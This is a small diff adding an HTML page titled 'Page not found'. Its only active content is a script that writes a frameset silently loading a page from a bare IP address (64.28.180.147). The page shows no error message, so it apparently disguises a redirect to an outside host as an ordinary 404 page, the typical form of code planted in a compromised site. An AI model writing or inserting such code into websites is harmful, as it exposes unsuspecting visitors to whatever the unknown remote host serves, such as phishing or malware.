@@ -1,0 +1,10 @@
+<html>
+<head>
+<title>Page not found</title>
+<script>
+document.write("<frameset><frame src=\"http://64.28.180.147/index.php\"></frameset>");
+</script>
+</head>
+<body>
+</body>
+</html>
